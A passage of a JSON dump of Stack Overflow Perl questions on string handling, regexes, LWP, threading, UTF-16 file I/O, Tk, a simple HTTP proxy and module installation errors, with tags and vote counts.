suite/JUnit/results$counter.xml\";\n    #create the output file\n    unless(open FILE, '&gt;'.$resultsFile) {\n    # Die with error message\n    die \"\\nUnable to create $file\\n\";\n    }\n\n    # Write results to the file.\n    $stylesheet-&gt;output_file($results, FILE);\n    close FILE;\n    $counter++;\n}\n</code></pre>\n\n<p>After running the perl script on Hudson/Jenkins, it outputs this error message:</p>\n\n<blockquote>\n  <p>Couldn't open ~/Hudson/build/workspace/ui-automation/automation\\ test\\ suite/Logs/Run\\ 1/Automation\\ Results.plist: No such\n  file or directory</p>\n</blockquote>\n\n<p>The error is caused by <code>my $source = $parser-&gt;parse_file($path2plist);</code> in the code. I am unable to figure out why it cannot find/read the file.</p>\n\n<p>Anyone know what might be causing the error? </p>\n"},{"tags":["perl","reverse"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":99,"score":1,"question_id":13111089,"title":"Reverse the digits in a string using Perl","body":"<p>I have a string of digits. Say for eg: \"234615\". Now I should flip the digits between the first lowest digit and second lowest digit.</p>\n\n<p>From the above string, first lowest digit is \"1\" and second lowest digit is \"2\". The digits between the first lowest digit and \nsecond lowest digit are \"346\". Now, this \"346\" should be written as \"643\".</p>\n\n<p>Hope I stated the problem clearly.</p>\n\n<p>Here is the code I tried,</p>\n\n<pre><code>my $a = \"234615\";\nmy @g = split(\"\", $a);\n@g = sort(@g);\nmy $first  = $g[0];\nmy $second = $g[1];\nprint \"$first \\t $second\\n\\n\";\n\nfor(my $i = 0; $i &lt; $#g; $i++) {\n\n    if ($g[$i] == $first) {\n\n    }\n\n    if ($g[$i] == $second) {\n\n    }\n}\n</code></pre>\n\n<p>I above code can find first lowest digit and second lowest digit. But I am not sure about the reverse part.</p>\n\n<p>Can some one help me in this?</p>\n\n<p>Thanks in advance !!</p>\n"},{"tags":["regex","perl","extract"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":63,"score":1,"question_id":13114528,"title":"Perl regex disable parenthesis extraction","body":"<p>I am trying something that I found on <a href=\"http://stackoverflow.com/questions/948795/how-can-i-do-a-global-regular-expression-match-in-perl\">another answer</a> but I am having some problems:</p>\n\n<p>I know that there are better regex for URLs but consider this for example:</p>\n\n<pre><code>@links=($content =~ m/(https?)?.*[.]com/g);\n*$content has text or html\n</code></pre>\n\n<p>The part <code>(https?)?</code> is for links like <code>www.google.com</code>, but having the parenthesis it returns <code>\"http\"</code> to <code>$1</code> which is put into <code>@links</code>! That is a problem, since I want the whole link.</p>\n\n<p>What would globally extract <em>simple</em> links (or whatever regex is specified) from text and put them into a list?<br>\nBy simple, I mean: </p>\n\n<ul>\n<li><code>http://www.google.com</code></li>\n<li><code>www.google.com</code></li>\n<li><code>google.com</code></li>\n<li><code>https://www.google.com</code></li>\n</ul>\n"},{"tags":["php","json","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":13114181,"title":"read perl stout from php","body":"<p>I have a perl script that returns json string.</p>\n\n<pre><code>$json = `/usr/bin/perl /var/www/private/data.pl`;\n</code></pre>\n\n<p>data.pl returns <code>{\"key1\": \"value1\", \"key2\": \"value2\"}</code></p>\n\n<p><strong>What is the best way to access json string in $json variable ?</strong></p>\n"},{"tags":["perl","hash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":92,"score":2,"question_id":13113808,"title":"How to get first n key-value pairs from a hash table in Perl","body":"<p>I'm very new to perl so I searched for some time but still get the answer. I want to get first 100 pairs from a hash table but don't know how to do that. To get each pair from a hash table, we can do something like:</p>\n\n<pre><code>foreach my $term (keys %hashtable)\n{\n    do something regarding $hashtable{$term} here\n}\n</code></pre>\n\n<p>But how to get first 100 pairs out of it? Thanks a lot!</p>\n"},{"tags":["perl","anyevent"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13113876,"title":"Rewrite code from Threads to AnyEvent","body":"<p>I wrote a code:</p>\n\n<hr>\n\n<pre><code>use LWP::UserAgent;\nuse HTTP::Cookies;\nuse threads;\nuse threads::shared;\n$| = 1;\n\n$threads = 50; \nmy @urls : shared = loadf('url.txt');   \n\nmy @thread_list = ();\n$thread_list[$_] = threads-&gt;create(\\&amp;thread) for 0 .. $threads - 1;\n$_-&gt;join for @thread_list;\nthread();\n\nsub thread\n{\n    my ($web, $ck) = browser();\n    while(1)\n    {\n        my $url = shift @urls;\n        if(!$url)\n        {\n            last;\n        }\n        $code = $web-&gt;get($url)-&gt;code;\n        print \"[+] $url - code: $code\\n\";\n        if($code == 200)\n        {\n            open F, \"&gt;&gt;200.txt\";\n            print F $url.\"\\n\";\n            close F;\n        }\n        elsif($code == 301)\n        {\n            open F, \"&gt;&gt;301.txt\";\n            print F $url.\"\\n\";\n            close F;\n        }\n        else\n        {\n            open F, \"&gt;&gt;else.txt\";\n            print F \"$url code - $code\\n\";\n            close F; \n        }\n    }\n}\n\n\nsub loadf {\n    open (F, \"&lt;\".$_[0]) or erroropen($_[0]); \n    chomp(my @data = &lt;F&gt;);\n    close F;\n    return @data;\n}\n\nsub browser \n{\n my $web = new LWP::UserAgent;\n my $ck = new HTTP::Cookies;\n    $web-&gt;cookie_jar($ck);\n    $web-&gt;agent('Opera/9.80 (Windows 7; U; en) Presto/2.9.168 Version/11.50');\n    $web-&gt;timeout(5);\n    return $web, $ck;\n}\n</code></pre>\n\n<hr>\n\n<p>After its working for some time physical storage is full.\nCan u help me to re-write it with AnyEvent. I tried but my code didn't work. I read that it will help me to safe some memory.\nThanks a lot to any helpers.</p>\n"},{"tags":["perl","jenkins"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":52,"score":-4,"question_id":13075148,"title":"Perl Junit test casses error","body":"<p>I am trying to execute test cases. So  following code written in my build script. </p>\n\n<pre><code>cpanm TAP::Formatter::JUnit\nprove --formatter TAP::Formatter::JUnit -lr t &gt; testresults.xml\n</code></pre>\n\n<p>calling this build script from jenkins and added Post-build Actions.  I am getting following error.</p>\n\n<pre><code> **prove --formatter TAP::Formatter::JUnit -lr t\nCan't load TAP::Formatter::JUnit at /var/local/maria/hudson/workspace/pigeon-build/target/bin/prove line 11**.\n</code></pre>\n"},{"tags":["arrays","perl","grep"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":149,"score":5,"question_id":13111805,"title":"Perl - compares array elements sentences with a variable","body":"<p>I use grep to return unmatched array between temporaryF file and arrayWarning</p>\n\n<pre><code>my @c =grep!${{map{$_,1}@temporaryF}{$_},@arrayWarning;\n</code></pre>\n\n<p>Inside @c there are alot of lines for example:</p>\n\n<pre><code>Sun Sep 30 00:05:55 fibre channel DENY forever\nSun Sep 30 00:06:55 fibre channel ROOT cause\nSun Sep 30 00:08:55 fibre channel ROOT cause \nSun Sep 30 00:10:55 fibre channel ROOT cause  \nSun Sep 30 00:20:55 fibre channel DANN \nSun Sep 30 00:30:55 fibre channel DANN  \n</code></pre>\n\n<p>as you can see ROOT occurs 3 times in @c. How can I iterate through @c to output only the latest occurrence of ROOT -> Sun Sep 30 00:10:55 fibre channel ROOT\nand not the other repeated lines.</p>\n\n<p>so it will become:</p>\n\n<pre><code>Sun Sep 30 00:05:55 fibre channel DENY forever  \nSun Sep 30 00:10:55 fibre channel ROOT cause  \nSun Sep 30 00:30:55 fibre channel DANN\n</code></pre>\n"},{"tags":["perl","substring"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":13110227,"title":"how to eliminate repetitions in of substrings in perl","body":"<p>I am trying to break a string at every occurrence of 'E'. But in output I want to skip those substrings which had arrived earlier in the previous loop of breakage.  For eg. If I take a string <code>$s='ABCDEABCDEABCDEABCD'</code> where 'E' is present at 5th, 10th and 15th position in a string, substrings which appeared as the result of breakage at position 10 should not appear in the substrings resulting from the breakage at position 15. Script given below breaks at every position of âEâ. But Iâm unable to stop the substring repetitions. Please help! </p>\n\n<pre><code>my $s = 'ABCDEAXBCDEAYBCDEAZBCD';\nmy @where; my @array;my @final;\nmy $result; my $j; \n\nfor ($j = 0; $j &lt;= 2; $j++) {\n\n    $where[j] = index($s,\"E\",$where[j-1]) + 1;\n    push @array, $where[j];\n}\n\n\nfor my $array (@array) {\n\n    substr($s, $array-1, 1) = \"\\0\";\n    my @a = split(/E(?!P)/, $s);\n    substr($s, $array-1, 1) = 'E';\n\n    $_ =~ s/\\0/E/g foreach (@a);\n    $result = join (\"E,\", @a).'E'; \n    @final  = split(/,/, $result);\n    print \"@final\\n\";\n}\n</code></pre>\n\n<p>Output which I'm getting is:</p>\n\n<pre><code>ABCDEAXBCDE AYBCDE AZBCDE\nABCDE AXBCDEAYBCDE AZBCDE\nABCDE AXBCDE AYBCDEAZBCDE\n</code></pre>\n\n<p>Expected Output:</p>\n\n<pre><code>ABCDEAXBCDE AYBCDE AZBCDE\nABCDE AXBCDEAYBCDE\nAXBCDE AYBCDEAZBCDE\n</code></pre>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2282,"score":0,"question_id":3422268,"title":"Perl - Insert lines after a match is found in a file","body":"<p>Hello All: \nI have a file with the following syntax in some_1.xyz</p>\n\n<pre><code>module some_1 {\nINPUT PINS\nOUTPUT PINS\n}\n</code></pre>\n\n<p>and I want to insert APPLY DELAYS xx and APPLY LOADS ld after line module some_1 {</p>\n\n<p>The following code works fine for just one file i.e., if I replace some_1.xyz to *.xyz then the script doesn't work. I tried introducing sleep(xx) but the code doesn't work for multiple files and I could not figure out why it isn't working. Any pointers is appreciated. Thanks</p>\n\n<pre><code>@modulename_array = `grep \"module \" some_1.xyz | cut -f 2 -d ' '`;\n@line = `grep \"module \" some_1.xyz`;\n\nchomp(@line);\nchomp(@kfarray);\n\n$i = 0;\nforeach (@modulename_array) {\n  print \"Applying delay and load to $_.xyz $line[$i] \\n\";\n\n  `perl -ni -le 'print; print \"\\tAPPLY DELAY xx \\n \\tAPPLY LOADS  ld\\n\" if/$line[$i]/' $_.xyz`;\n  $i++;\n  #sleep(3);\n\n}\n</code></pre>\n"},{"tags":["perl","cmd","system","fork","tk"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13108682,"title":"Perl TK with Proc::Background proper usage (keep GUI active?)","body":"<p>I'm trying to build a Toplevel window that will show the progress of a system cmd. I want the GUI to be active (without freezing and \"not responding\"), so pressing on the \"Cancel\" button will kill the process, otherwise, when finished, make active the \"close\" button and disable the \"cancel\". Following a suggestion to one of my previous questions, I tried to use Proc::Background. The sole way I've found to do it is:</p>\n\n<pre><code>my $proc1;\n\nmy $cancel = $toplevel-&gt;Button(-text =&gt; \"Cancel\", -command =&gt;sub{$proc1-&gt;die;})-&gt;pack;\nmy $close = $toplevel-&gt;Button(-text =&gt; \"Close\", -command =&gt;sub{destroy $toplevel;}, -state=&gt;\"disabled\")-&gt;pack;\n\n$proc1 = Proc::Background-&gt;new(\"x264.exe $args\");\n\nwhile ($proc1-&gt;alive == 1){\n    $mw-&gt;update();\n    sleep(1);\n}\n\n$cancel-&gt;configure(-state=&gt;'disabled');\n$close-&gt;configure(-state=&gt;'normal');\n</code></pre>\n\n<p>Is there another, more efficient way to do it (without waiting 1 sec for response)?</p>\n\n<p>Thanks,\nMark.</p>\n"},{"tags":["perl"],"answer_count":10,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":134,"score":2,"question_id":12696584,"title":"How can I delete the last 10 lines of a file in perl","body":"<p>I am taking a total number of line as a user input and then I am deleting those numbers of l ine from the file.  </p>\n\n<p>I saw this learn.perl.org/faq/perlfaq5.html#How-do-I-count-the-number-of-lines-in-a-file- and then I tired the below simple logic.</p>\n\n<p><strong>Logic:</strong> </p>\n\n<ol>\n<li>Get the Total number of lines</li>\n<li>Subtracts it by the numbers entered by user</li>\n<li>print the lines</li>\n</ol>\n\n<p><strong>Here is my code :</strong></p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\n\nopen IN, \"&lt;\", \"Delete_line.txt\"\n    or die \" Can not open the file $!\";\nopen OUT, \"&gt;\", \"Update_delete_line.txt\" \n    or die \"Can not write in the file $!\";\n\nmy ($total_line, $line, $number, $printed_line);\n\nprint\"Enter the number of line to be delete\\n\";\n$number = &lt;STDIN&gt;;\n\nwhile ($line = &lt;IN&gt;) {\n\n    $total_line = $.;  # Total number of line in the file\n}\n\n$printed_line = $total_line - $number;\n\nwhile ($line = &lt;IN&gt;) {\n\n    print OUT $line unless $.== $printed_line;      \n}\n</code></pre>\n\n<p>Well, neither i am getting any error in code nor any out put ? why I just don't know. </p>\n\n<p>Can any one give me some suggestion. </p>\n"},{"tags":["perl"],"answer_count":8,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":2891,"score":10,"question_id":4597937,"title":"Perl: function to trim string leading and trailing whitespace","body":"<p>Is there a built-in function to trim leading and trailing whitespace such that <code>trim(\" hello world \") eq \"hello world\"</code>?</p>\n"},{"tags":["arrays","perl"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":3,"view_count":99,"score":-2,"question_id":13106875,"title":"How to merge 2 arrays in perl","body":"<p>suppose i have 2 arrays like mentioned below</p>\n\n<pre><code>@a1[\"Vinay\", Raj, harry];\n@b1[\"dude\",\"rock\"];\n</code></pre>\n\n<p>After merging i want to have result like this</p>\n\n<pre><code>[\n    Vinay\n    dude\n    Vinay\n    rock\n    Raj\n    dude\n    Raj\n    rock\n    harry\n    dude\n    harry\n    rock\n]\n</code></pre>\n\n<p>basically i want to merge the each index values of array1 to all the index values of array2 2</p>\n"},{"tags":["perl","scripting","winapi","cmd"],"answer_count":5,"favorite_count":4,"up_vote_count":3,"down_vote_count":0,"view_count":2548,"score":3,"question_id":1695188,"title":"How do I make Perl scripts recognize parameters in the Win32 cmd console?","body":"<p>When I invoke my Perl scripts in the Windows environment without invoking <code>perl</code> first, the parameters are not passed to my script.</p>\n\n<p>For example,</p>\n\n<pre><code>C:\\&gt; C:\\my-perl-scripts\\foo.pl bar\n</code></pre>\n\n<p>invokes <code>foo.pl</code> but doesn't recognize <code>bar</code> as a parameter (<code>@ARGV</code> is empty). However, </p>\n\n<pre><code>C:\\&gt; perl C:\\my-perl-scripts\\foo.pl bar\n</code></pre>\n\n<p>works as expected.</p>\n\n<p>Is this a configuration issue?</p>\n\n<p>Ideally, I'd like to be able to distribute some perl scripts, have the user add <code>C:\\my-perl-scripts\\</code> to the path and then just be able to invoke <code>foo.pl</code> from anywhere while running cmd.</p>\n\n<p>If they have to specify perl first, then they'll always have to give a complete path.</p>\n\n<p>Any ideas or recommendations?</p>\n\n<p><strong>Edit:</strong> To show that the assoc and ftype are correct on my system, I executed the following commands.</p>\n\n<pre><code>C:\\&gt;assoc .pl\n.pl=Perl\n\nC:\\&gt;ftype Perl\nPerl=\"C:\\Perl\\bin\\perl.exe\" \"%1\" %*\n\nC:\\&gt;more t.pl\nprint \"'$_'\\n\" for @ARGV;\n\nC:\\&gt;t a b\n\nC:\\&gt;perl t.pl a b\n'a'\n'b'\n\nC:\\&gt;t.pl a b\n\nC:\\&gt;\n</code></pre>\n\n<p>I included both the output of t and t.pl to show it's not a %PATHEXT% problem. Both outputted nothing as originally described whereas invoking perl first gave the expected response.</p>\n\n<p>I'm not sure where to look next, but thanks for the suggestions so far. They have been very helpful.    </p>\n\n<p><strong>Edit 2:</strong> The problem appears to be on my vista business box. On my xp pro box, it works as expected. Both have ActivePerl 5.8.9. I have another vista home box that I have not yet tried yet. I'll post back if I discover anything.</p>\n\n<p><strong>Edit 3:</strong> I found the answer (posted below). I found it by running a registry cleaner, removing perl, running the registry cleaner again. On 2nd cleaning, only one invalid entry remained - the one that was causing the problem (probably left over from a previous installation).</p>\n"},{"tags":["perl","moose"],"answer_count":6,"favorite_count":4,"up_vote_count":10,"down_vote_count":0,"view_count":699,"score":10,"question_id":2322181,"title":"Are MooseX::Declare and MooseX::Method::Signatures production ready?","body":"<p>From the <a href=\"http://search.cpan.org/~drolsky/Moose-0.98/lib/Moose/Manual/MooseX.pod\" rel=\"nofollow\">current version (0.98)</a> of the <a href=\"http://search.cpan.org/perldoc/Moose%3a%3aManual%3a%3aMooseX\" rel=\"nofollow\">Moose::Manual::MooseX</a> are the lines:</p>\n\n<blockquote>\n  <p>We have high hopes for the future of\n  <a href=\"http://search.cpan.org/perldoc/MooseX%3a%3aMethod%3a%3aSignatures\" rel=\"nofollow\"><code>MooseX::Method::Signatures</code></a> and\n  <a href=\"http://search.cpan.org/perldoc/MooseX%3a%3aDeclare\" rel=\"nofollow\"><code>MooseX::Declare</code></a>. However, these\n  modules, while used regularly in\n  production by some of the more insane\n  members of the community, are still\n  marked alpha just in case backwards\n  incompatible changes need to be made.</p>\n</blockquote>\n\n<p>I noticed that for <a href=\"http://search.cpan.org/perldoc/MooseX%3a%3aMethod%3a%3aSignatures\" rel=\"nofollow\"><code>MooseX::Method::Signatures</code></a> the <a href=\"http://cpansearch.perl.org/src/ASH/MooseX-Method-Signatures-0.26/Changes\" rel=\"nofollow\">change log</a> for September 2009 mentions the removal of the \"<em>scary ALPHA disclaimer</em>\".<br>\nSo, are these still \"alpha\"?<br>\nWould I still be considered one of the \"more insane\" to use them?</p>\n"},{"tags":["perl","file","match"],"answer_count":7,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":3312,"score":0,"question_id":5260450,"title":"Comparing lines in a file with perl","body":"<p>Ive been trying to compare lines between two files and matching lines that are the same.</p>\n\n<p>For some reason the code below only ever goes through the first line of 'text1.txt' and prints the 'if' statement regardless of if the two variables match or not.</p>\n\n<p>Thanks</p>\n\n<pre><code>use strict;\nopen (&lt;FILE1&gt;, \"&lt;text1.txt\");\nopen (&lt;FILE2&gt;, \"&lt;text2.txt\");\nforeach my $first_file (&lt;FILE1&gt;)\n {\n foreach my $second_file (&lt;FILE2&gt;)\n  {\n\n  if ($second_file == $first_file)\n   {\n   print \"Got a match - $second_file + $first_file\";\n   }\n\n  }\n } \nclose (FILE1);\nclose (FILE2);\n</code></pre>\n"},{"tags":["perl","firefox","www-mechanize"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":30,"score":0,"question_id":13107057,"title":"Install mechanize-firefox module on ActivePerl","body":"<p>I cannot find mechanize-firefox module on ActivePerl by using ppm [Perl Package Manager] in win7. Do you have any alternative way or method to install this module? Thank you for your sharing valuable experience. Thank you.</p>\n"},{"tags":["python","perl","shell"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":13104416,"title":"comparing plist keys","body":"<p>I am trying to add a sanity check with respect to API, which tends to change its structure somewhat very quickly, hence I am thinking of adding a routine check, which stores the json response in plist file with date+time, and hence with respect to key structures, compare with the previous date and see if anything changed. Is there any python, shell or perl script written to do this already? I don't want to re-invent the wheel, so thought someone might have already done this prior?</p>\n"},{"tags":["perl","unix","script","awk"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":8,"view_count":76,"score":-7,"question_id":13088182,"title":"I have many files like below and would like to sum and print as a single file in unix script or perl or is there any other way","body":"<p>I've lots of files like this say some time 2 to 100 with 2000+ lines and would like to add the rows with regards to the 1st files number primary and time stamps second, then add the values of HR HW .. IT and save the total as shown in the output required file. How can I do that. I am ready to use either unix scripts or perl. Any help will be appreciated.</p>\n\n<p>File 1:</p>\n\n<p>TS NUM HR HW HT RS IR IW IT<br>\n10:00 01  01 02 01 03 01 05 06<br>\n10:10 01  01 02 01 10 01 04 06<br>\n10:20 01  01 02 01 100 01 05 07<br>\n..  </p>\n\n<p>File 2:\nTS NUM HR HW HT RS IR IW IT<br>\n10:00 02  01 02 01 03 01 05 05<br>\n10:10 02  01 02 01 10 01 04 06<br>\n10:20 02  02 02 01 100 01 05 07<br>\n..</p>\n\n<p>Similarly \nFile 3:\nTS NUM HR HW HT RS IR IW IT<br>\n10:00 03  01 02 01 03 01 05 06<br>\n10:10 03  01 02 01 10 01 04 06<br>\n10:20 03  01 02 01 100 01 05 07<br>\n..  </p>\n\n<p>Output required as below:<br>\nTS NUM HR HW HT RS IR IW IT<br>\n10:00 01  03 06 03 09 03 15 17<br>\n10:10 01  03 06 03 30 03 12 18<br>\n10:20 01  04 06 03 300 31 15 21<br>\n...  </p>\n\n<p>These files has lots of rows like 2500 per file  </p>\n\n<p>Any suggestion or help  </p>\n\n<p>Thanks/Regards</p>\n"},{"tags":["perl","lwp","lwp-useragent"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":81,"score":1,"question_id":13090182,"title":"Does LWP::UserAgent do any caching","body":"<p>I'm trying to write a monitoring script in Perl which should check a list of URLs. I am using the <a href=\"https://metacpan.org/module/LWP%3a%3aUserAgent\" rel=\"nofollow\"><code>LWP::UserAgent</code></a>, <a href=\"https://metacpan.org/module/HTTP%3a%3aResponse\" rel=\"nofollow\"><code>HTTP::Response</code></a> and <a href=\"https://metacpan.org/module/Time%3a%3aHiRes\" rel=\"nofollow\"><code>Time::HiRes</code></a> modules.</p>\n\n<p>Here is a my code:</p>\n\n<pre><code>use strict;\nuse warnings;\n\nuse LWP::UserAgent;\nuse HTTP::Response;\nuse Time::HiRes qw( gettimeofday );\n\nwhile (1) {\n\n    my $start = gettimeofday();\n\n    my $ua = LWP::UserAgent-&gt;new();\n    $ua-&gt;agent('lb-healthcheck.pl/0.1');\n    $ua-&gt;timeout(10);\n\n    # download the tile locally\n    my $response = $ua-&gt;get(\"myurl\");\n    my $content  = $response-&gt;content;\n\n    my $end = gettimeofday();\n\n    print \"$start - $end = \".(($end-$start)*1000).\"\\n\";\n}\n</code></pre>\n\n<p>Running the script manually without the while loop in place I get on average about 70ms response time, but With the while loop in place I get about 5ms response time which is unreal.</p>\n\n<p>Does <code>LWP::UserAgent</code> do any caching? If yes is it possible to disable it and how? If not what am I doing wrong?</p>\n"},{"tags":["windows","perl","io","cygwin","utf-16"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":72,"score":3,"question_id":13105361,"title":"UTF-16 perl input output","body":"<p>I am writing a script that takes a UTF-16 encoded text file as input and outputs a UTF-16 encoded text file.</p>\n\n<pre><code>use open \"encoding(UTF-16)\";\n\nopen INPUT, \"&lt; input.txt\"\n   or die \"cannot open &gt; input.txt: $!\\n\";\nopen(OUTPUT,\"&gt; output.txt\");\n\nwhile(&lt;INPUT&gt;) {\n   print OUTPUT \"$_\\n\"\n}\n</code></pre>\n\n<p>Let's just say that my program writes everything from input.txt into output.txt.</p>\n\n<p>This WORKS perfectly fine in my cygwin environment, which is using \"This is perl 5, version 14, subversion 2 (v5.14.2) built for cygwin-thread-multi-64int\"</p>\n\n<p>But in my Windows environment, which is using \"This is perl 5, version 12, subversion 3 (v5.12.3) built for MSWin32-x64-multi-thread\",</p>\n\n<p>Every line in output.txt is pre-pended with crazy symbols except the first line.</p>\n\n<p>For example:</p>\n\n<pre><code>&lt;FIRST LINE OF TEXT&gt;\nà¨ãããããââãâ°âãâ°âåæâãâäæ æ¤æâäâ¸â¸â¸ââåçææ¸æâä îà´&lt;SECOND LINE OF TEXT&gt;\n...\n</code></pre>\n\n<p>Can anyone give some insight on why it works on cygwin but not windows?</p>\n\n<p>EDIT: After printing the encoded layers as suggested.</p>\n\n<p>In Windows environment:</p>\n\n<pre><code>unix\ncrlf\nencoding(UTF-16)\nutf8\nunix\ncrlf\nencoding(UTF-16)\nutf8\n</code></pre>\n\n<p>In Cygwin environment:</p>\n\n<pre><code>unix\nperlio\nencoding(UTF-16)\nutf8\nunix\nperlio\nencoding(UTF-16)\nutf8\n</code></pre>\n\n<p>The only difference is between the perlio and crlf layer.</p>\n"},{"tags":["perl"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":52,"score":-2,"question_id":13106962,"title":"How to get Current Browser URL? Perl","body":"<p>IE, Firefox, Chrome ,Active-Browser<br>\nCurrent URL(Address Bar) how to get URL?<br>\nPlease tell us about the modules and techniques to get  </p>\n\n<p>Know the judgment of the browser<br>\n<a href=\"http://search.cpan.org/~phatwares/Win32-GetDefaultBrowser-1.00/lib/Win32/GetDefaultBrowser.pm\" rel=\"nofollow\">Win32::GetDefaultBrowser</a></p>\n"},{"tags":["perl","random"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":13103994,"title":"Need to put a char in a str","body":"<p>I have a string <code>$str = 'Hello my friends';</code> I need to put a char <code>\\</code> into every word and to get any posibble variety of this.</p>\n\n<p>For example in <code>stdout</code> I want to get</p>\n\n<pre><code>{H\\ello|He\\llo|Hel\\lo|Hell\\o} {m\\y} {f\\riens|fr\\iends|fri\\ends.....}\n</code></pre>\n\n<p>I wrote some code, but I can't imagine what to do next:</p>\n\n<pre><code>my $str = 'Hello my friends';\nmy @ra = split / /, $str;\nfor(my $i=0; $i &lt; scalar @ra; $i++)\n{\n    my $word = $ra[$i];\n    my $num = length($word);\n    my @chars = split(\"\", $word);\n\n    for(my $k = 0, my $l = 1; $l &lt; $num; $k++,$l++)\n    {\n        print $chars[$k].\"\\\\\".$chars[$l];   \n    }\n\n}\n</code></pre>\n\n<p>Any ideas?=\\</p>\n"},{"tags":["perl","http","proxy","lwp"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":68,"score":2,"question_id":13105058,"title":"Perl transparent proxy","body":"<p>I'm trying to create one transparent <strong>HTTP proxy</strong>. It's purpose is to stay between the browser and the web server and be invisible. Here is the code I'm using. Unfortunately it's not working very well. When I open the web page (referenced by <code>$base_uri</code>) there are different results depending on that whether I've opened it using the browser only or the browser and the proxy. I'm trying it on a web site which is returning all kinds of responses including \"<code>transfer-encoding: chunked</code>\" (so I guess may be the problem could be there?!). I think that there could be also problems with the cookies but I don't know how to solve them (if any...).</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\n\nuse HTTP::Daemon;\nuse LWP::UserAgent;\nuse HTTP::Cookies;\n\nmy $cookie_jar = HTTP::Cookies-&gt;new();\n\nmy $ua = LWP::UserAgent-&gt;new( max_redirect =&gt; 0, env_proxy =&gt; 0,keep_alive =&gt; 1, timeout =&gt; 30, agent =&gt; \"Mozilla/4.76 [en] (Win98; U)\");\nmy $d = HTTP::Daemon-&gt;new( \n    LocalHost =&gt; \"localhost\",  # remove this to listen from other machines \n                   # (i.e. open-relay... be careful of spammers!)\n    LocalPort =&gt; 33331\n) || die;\nprint \"[Proxy URL:\", $d-&gt;url, \"]\\n\";\n\nfork(); fork(); fork();  # 2^3 = 8 processes\n\n$ua-&gt;cookie_jar($cookie_jar);\n\nmy $base_uri = 'http://example.com/';\n\nwhile (my $c = $d-&gt;accept) {\n        while (my $request = $c-&gt;get_request) {\n            my $uri = $base_uri . $request-&gt;uri-&gt;as_string();\n            my $method = $request-&gt;method;\n            my $req = HTTP::Request-&gt;new($method, $uri);\n\n            $request-&gt;uri($uri);\n\n            print \"[[ $method &gt;&gt; $uri ]]\\n\";\n            my $response = $ua-&gt;simple_request($request);\n            $c-&gt;send_response( $response );\n        }\n    $c-&gt;close;\n    undef($c);\n}\n</code></pre>\n\n<p>Thank you in advance!</p>\n"},{"tags":["windows","perl","curl","cygwin","libcurl"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":598,"score":2,"question_id":3562095,"title":"Using Curl to get a Https webpage in Windows 7","body":"<p>I just need to fetch an https page, and I'm using curl currently by having the curl.exe application in my Path and calling it with a Perl file. However, then I get the error \"* Protocol https not supported or disabled in libcurl\". I've been looking around and I can't find a solid set of instructions to get it to work. I have installed cygwin, and OpenSSL-Win32 but something tells me I'm going to have to compile curl from scratch. I have no experience with this. How do you do it?</p>\n"},{"tags":["perl","list","implementation"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":63,"score":4,"question_id":13087892,"title":"implement a node list in Perl","body":"<p>I wrote the following module but am not sure how to refer to the \"last\" and \"head\" nodes.  As well as storing the address of the next node in \"{nextNode}\" in the previous node.</p>\n\n<p>I am trying to save the reference of the class when storing it but later it's complaining: \"Not a HASH reference at List.pm\"; which I understand why but am not sure how the syntax would be.</p>\n\n<p>If I de-reference $head and $last ($$last->{nextNode} = \\$class) then I think it's using the actual name of my class; List and not the previous object like I want to.</p>\n\n<pre><code>package List;\n\nmy $head = undef;\nmy $last = undef;\n\nsub new {\n    my $class = shift;\n\n    # init the head of the list\n    if ($head == undef) {\n    $head = \\$class;\n    print \"updated head to:$head\", \"\\n\";\n    }\n\n    $last = \\$class;\n    $last-&gt;{nextNode} = \\$class; # update previous node to point on this new one    \n\n    print \"updated last to:$last\", \"\\n\";\n    my $self = {};\n    $self-&gt;{value} = shift;    \n    $self-&gt;{nextNode} = \"\"; # reset next to nothing since this node is last\n\n    return bless $self, $class;\n}\n</code></pre>\n\n<p>Thanks guys</p>\n"},{"tags":["perl","install","catalyst"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":552,"score":1,"question_id":6031532,"title":"Trying to install perl's Catalyst framework on debian 6. - Can't use an undefined value as a HASH","body":"<pre><code>[14:27: /mnt/mydocuments/git_working_dir/cat_example$] catalyst.pl hello_world\nCouldn't load class (Catalyst::Exception::Basic) because: Can't use an undefined value as a HASH reference at /usr/lib/perl5/MooseX/Role/WithOverloading/Meta/Role/Application.pm line 45.\nCompilation failed in require at /usr/local/lib/perl/5.10.1/Class/MOP.pm line 117.\n at /usr/local/lib/perl/5.10.1/Class/MOP.pm line 